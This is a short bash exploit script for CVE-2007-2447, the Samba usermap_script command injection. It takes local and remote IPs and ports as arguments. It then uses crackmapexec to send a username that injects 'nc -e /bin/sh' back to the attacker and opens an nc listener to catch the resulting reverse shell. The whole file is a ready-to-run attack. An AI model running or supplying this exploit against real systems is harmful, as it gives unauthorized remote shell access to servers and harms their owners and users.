#!/bin/bash

# Exploit CVE-2007-2447 abusing usermap command injection to obtain RCE
# Author: oscar-rk - https://github.com/oscar-rk


# User exit handling
function ctrl_c(){
   echo -e "[!] Exiting script ...\n"   
   exit 1
}

# User exit catching
trap ctrl_c INT

# Args check
if [ "$#" -ne 4 ]; then
   echo -e "[!] Usage: $0 <local ip> <local port> <remote ip> <remote port>\n"
   exit 1
fi

# Exploit
function exploit(){
	# Initialising SMB exploitation
	sleep 1
	echo -e "starting exploit on [$3] $4 ..."
	crackmapexec --timeout 3 smb $3 --port $4 -u '/=`nohup nc -e /bin/sh '$1' '$2'`' -p '' &>/dev/null &

	# Listening for incoming reverse shell
	nc -nlvp $2 -w 10 #<-- Will exit script automatically if no reverse shell received after 10 seconds
}

# Execution
exploit $1 $2 $3 $4
